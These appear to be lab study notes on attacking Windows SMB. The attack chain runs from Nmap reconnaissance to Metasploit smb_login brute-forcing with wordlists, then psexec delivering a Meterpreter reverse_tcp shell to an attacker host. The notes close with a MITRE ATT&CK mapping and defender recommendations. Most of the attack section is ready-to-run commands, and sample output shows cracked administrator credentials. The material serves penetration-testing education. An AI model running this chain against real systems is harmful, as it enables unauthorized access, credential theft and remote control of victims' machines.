# O.R. 3.3 - Attacking SMB via Metasploit and PSexec

## Overview

- **SMB (Server Message Block)** – file/print sharing protocol, commonly targeted by attackers.
- **Attack vector:** Port 445 (SMB) + weak/brute-forced credentials.
- **Tools used:** Nmap (recon) → Metasploit (`smb_login` brute-force) → `psexec` (execution) → Meterpreter shell.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -A 10.2.23.46 -vv
```

**Findings:**
- Port **445** (SMB) is open.
- TTL values help identify OS:

| OS | Default TTL |
|----|-------------|
| Unix/Linux | 64 |
| Windows | 128 |
| Solaris/AIX | 25 |

### SMB Protocol Script

```bash
nmap -p445 --script smb-protocols 10.2.23.46 -vv
```

- Confirms SMB service details and supported protocols.

---

## Exploitation with Metasploit

### Step 1: Start Metasploit

```bash
msfconsole
```

### Step 2: Load SMB Login Module

```bash
use auxiliary/scanner/smb/smb_login
```

### Step 3: Configure Options

```bash
set RHOSTS 10.2.23.46
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/password.lst
set VERBOSE true
run
```

**What it does:** Brute-forces SMB credentials using wordlists.

### Step 4: Identify Compromised Accounts

- Metasploit returns a list of valid username/password combinations.
- **Example output:** `[+] 10.2.23.46:445 - User: administrator Password: password`

---

### Step 5: Load PSExec Module

```bash
use exploit/windows/smb/psexec
```

### Step 6: Configure PSExec

```bash
set RHOSTS 10.2.23.46
set SMBUser administrator
set SMBPass password
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

### Step 7: Meterpreter Shell

- On success, a **Meterpreter session** is opened.
- Allows:
  - Command execution
  - File upload/download
  - Privilege escalation
  - Persistence
  - Pivoting

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Discovery | System Information Discovery | T1082 |
| Credential Access | Brute Force | T1110 |
| Lateral Movement | SMB/Windows Admin Shares | T1021.002 |
| Execution | PsExec | T1569.002 |
| Command & Control | Standard Application Layer Protocol | T1071 |

---

## Quick Reference: Attack Workflow

| Step | Action | Tool |
|------|--------|------|
| 1 | Identify SMB (port 445) | Nmap |
| 2 | Enumerate TTL for OS | Nmap |
| 3 | Brute-force credentials | `smb_login` (Metasploit) |
| 4 | Execute commands remotely | `psexec` (Metasploit) |
| 5 | Obtain shell | Meterpreter |

### Key Metasploit Commands

```bash
# Recon
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.2.23.46
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/password.lst
run

# Exploitation
use exploit/windows/smb/psexec
set RHOSTS 10.2.23.46
set SMBUser <found_user>
set SMBPass <found_pass>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

---

## Key Takeaways

- **SMB (port 445)** is a common entry point for lateral movement and credential harvesting.
- **TTL values** provide quick OS fingerprinting during recon.
- **`smb_login`** module brute-forces credentials using wordlists – effective against weak passwords.
- **PSExec** (Microsoft tool) allows remote execution on Windows systems – widely used by both administrators and attackers.
- **Meterpreter** provides a powerful, interactive shell for post-exploitation.
- **Defender mindset:**
  - Enforce strong password policies.
  - Enable account lockout after failed attempts.
  - Monitor SMB logs for brute-force patterns.
  - Restrict PSExec usage and limit admin shares.
  - Implement endpoint detection to identify lateral movement.